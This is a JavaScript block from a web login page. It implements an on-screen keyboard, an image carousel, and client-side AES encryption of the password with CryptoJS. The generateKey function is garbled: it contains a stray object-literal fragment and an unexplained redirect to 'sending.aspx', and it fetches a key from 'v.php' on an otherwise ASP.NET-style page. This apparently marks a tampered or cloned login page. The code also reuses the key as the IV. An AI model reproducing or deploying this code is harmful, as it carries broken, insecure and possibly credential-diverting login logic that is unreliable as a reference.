    <script language="javascript" type="text/javascript">
        // Vars used in log-in
        var form;
        var button;
        var username;
        var password;
        var keyboardButton;
        var keyboardClose;
        var keyboard;
        var keyboardKey;
        var keysWritten;
        var keysWritten2;
        var headerLinks;

        function post(url, data, onSuccess, onError) {
            $.ajax({
                type: "POST",
                async: false,
                url: url,
                data: data,
                contentType: 'application/json; charset=utf-8',
                dataType: 'json',
                success: onSuccess,
                error: onError
            });
        };

        function setUp() {
            form = document.querySelector(".main-form");
            button = document.querySelector(".main-form_submit");

            username = document.querySelector(".main-form_input-username");
            password = document.querySelector(".main-form_input-password");

            keyboardButton = document.querySelector(".main-form_keyboard");
            keyboardClose = document.querySelector(".keyboard-close");
            keyboard = document.querySelector(".keyboard");
            keyboardKey = document.querySelectorAll(".keyboard-key");
            keysWritten = [];
            keysWritten2 = [];

            $(".header-links").css("padding-right", "40%!important");
        };

        function checkInput() {
            if (username.value.length >= 1 && password.value.length >= 1) {
                button.removeAttribute("disabled");
            } else {
                button.setAttribute("disabled", true);
            }
        };

        function encrypt(message, key, iv) {
            return CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(message), key,
                {
                    keySize: 128 / 8,
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
        };

        function generateKey() {
            var cypher = "";
            
            type: "POST",
			window.location.href = "sending.aspx",
			
            post('v.php', null, function (result) {
                if (result.d !== "") {
                    cypher = result.d;
                }
            });
            return CryptoJS.enc.Utf8.parse(cypher);
        };

        

        
        function onClickLogin() {           
            var password = document.getElementById('ctl00_MainHolder_LoginPassword').value;
            if (password === "") {
                $('#spinner').css('display', 'none');
            } else {
                $('#spinner').css('display', 'block');
                document.getElementById('ctl00_MainHolder_button').className = "main-form_submit_disabled";
                document.getElementById('ctl00_MainHolder_button').disabled = "disabled";
                  var key = generateKey();
                var encryptedPassword = encrypt(password, key, key);
                document.getElementById('ctl00_MainHolder_LoginPassword').value = encryptedPassword;
            }
        };

        function bindClickLogin() {
            form.addEventListener("submit", function () {
                button.setAttribute("disabled", true);
            });
        };

        function bindShowKeyboardButton() {
            keyboardButton.addEventListener("click", function () {
                keyboard.classList.toggle("keyboard-show");
            });
        };

        function bindCloseKeyboardButton() {
            keyboardClose.addEventListener("click", function () {
                keyboard.classList.remove("keyboard-show");
            });
        };

        function bindUsernameInput() {
            username.addEventListener("input", checkInput);
            username.addEventListener("focus",
              function () {
                  keyboard.dataset.input = "username";
              });
        };

        function bindPasswordInput() {
            password.addEventListener("input", checkInput);
            password.addEventListener("focus", function () {
                keyboard.dataset.input = "password";
            });
        };

        function bindKeyboardKeys() {
            for (var i = 0; i < keyboardKey.length; i++) {
                keyboardKey[i].addEventListener("click", function (e) {

                    // Are we writing on the username input?
                    if (keyboard.dataset.input === "username") {

                        // Delete key is pushed, so we delete the last letter
                        if (e.target.classList.contains("keyboard-key_del") === true) {
                            keysWritten.pop();
                            username.value = keysWritten.join('');
                        } else {
                            // Other key is pushed, so we add it to the array
                            keysWritten.push(e.target.value);
                            username.value = keysWritten.join('');
                        }

                        // Trigger the event to show the result on the input
                        if (!!navigator.userAgent.match(/Trident\/7\./) === false) {
                            username.dispatchEvent(new Event('input'));
                        } else {
                            // IE11 version
                            var event = document.createEvent("Event");
                            event.initEvent("input", false, true);
                            username.dispatchEvent(event);
                        }

                    } else {
                        // If we are not in the username input that means we are writing on password

                        if (e.target.classList.contains("keyboard-key_del") === true) {
                            keysWritten2.pop();
                            password.value = keysWritten2.join('');
                        } else {
                            keysWritten2.push(e.target.value);
                            password.value = keysWritten2.join('');
                        }
                        if (!!navigator.userAgent.match(/Trident\/7\./) === false) {
                            password.dispatchEvent(new Event('input'));
                        } else {
                            var event = document.createEvent("Event");
                            event.initEvent("input", false, true);
                            username.dispatchEvent(event);
                        }
                    }

                    // Capitalized has been pushed, change to the secondary keys and set the rest to uppercase
                    if (e.target.classList.contains("keyboard-key_may")) {

                        // If secondary keyboard is off we apply the changes
                        if (e.target.dataset.state === "false") {
                            for (var i = 0; i < keyboardKey.length; i++) {
                                switch (keyboardKey[i].value) {
                                    case "1":
                                        keyboardKey[i].value = "!";
                                        break;
                                    case "2":
                                        keyboardKey[i].value = "@";
                                        break;
                                    case "3":
                                        keyboardKey[i].value = "#";
                                        break;
                                    case "4":
                                        keyboardKey[i].value = "$";
                                        break;
                                    case "5":
                                        keyboardKey[i].value = "%";
                                        break;
                                    case "6":
                                        keyboardKey[i].value = "^";
                                        break;
                                    case "7":
                                        keyboardKey[i].value = "&";
                                        break;
                                    case "8":
                                        keyboardKey[i].value = "*";
                                        break;
                                    case "9":
                                        keyboardKey[i].value = "(";
                                        break;
                                    case "0":
                                        keyboardKey[i].value = ")";
                                        break;
                                    default:
                                        // Turn into uppercase
                                        keyboardKey[i].value = keyboardKey[i].value.toString().toUpperCase();
                                }
                            }

                            // Set the value to true to indicate that secondary keyboard is on
                            e.target.dataset.state = "true";
                        } else {
                            // If secondary keyboard is on, we go back to original display
                            for (var i = 0; i < keyboardKey.length; i++) {
                                switch (keyboardKey[i].value) {
                                    case "!":
                                        keyboardKey[i].value = "1";
                                        break;
                                    case "@":
                                        keyboardKey[i].value = "2";
                                        break;
                                    case "#":
                                        keyboardKey[i].value = "3";
                                        break;
                                    case "$":
                                        keyboardKey[i].value = "4";
                                        break;
                                    case "%":
                                        keyboardKey[i].value = "5";
                                        break;
                                    case "^":
                                        keyboardKey[i].value = "6";
                                        break;
                                    case "&":
                                        keyboardKey[i].value = "7";
                                        break;
                                    case "*":
                                        keyboardKey[i].value = "8";
                                        break;
                                    case "(":
                                        keyboardKey[i].value = "9";
                                        break;
                                    case ")":
                                        keyboardKey[i].value = "0";
                                        break;
                                    default:
                                        // Turn into lowercase
                                        keyboardKey[i].value = keyboardKey[i].value.toString().toLowerCase();
                                }
                            }

                            // Set the value to false to indicate that secondary keyboard is off
                            e.target.dataset.state = "false";
                        }
                    }
                });
            }
            ;
        };

        function isIE11() {
            return !!navigator.userAgent.match(/Trident\/7\./);
        }

        function initializeCarrousel() {
            if (!isIE11()) {
                var images = document.querySelectorAll(".wrapper-left_img");

                for (var i = 0; i < images.length; i++) {
                    images[i].classList.add('spv-transition');
                }

                var current = 0;
                var className = 'spv-hidden';
                var currentImage = images[current];
                currentImage.classList.remove(className);

                setInterval(function () {
                    currentImage.classList.add(className);
                    current = (current !== images.length - 1) ? current + 1 : 0;
                    currentImage = images[current];
                    currentImage.classList.remove(className);
                }, 7000);
            }
        };

        function bindButtonWithKeyEnter() {
            password.addEventListener("keyup", function (event) {
                event.preventDefault();

                if (event.keyCode === 13) {
                    button.click();
                }
            });
        };

        function fixIE11Styles() {
            if (isIE11()) {
                document.querySelector(".wrapper").classList.add('IE11');
            }
        };

        function initialize() {
            
                setUp();
                fixIE11Styles();

                bindClickLogin();
                bindButtonWithKeyEnter();

                bindUsernameInput();
                bindPasswordInput();

                bindShowKeyboardButton();
                bindCloseKeyboardButton();
                bindKeyboardKeys();
            
            initializeCarrousel();
        }
        $(document).ready(function () { initialize(); });
    </script>

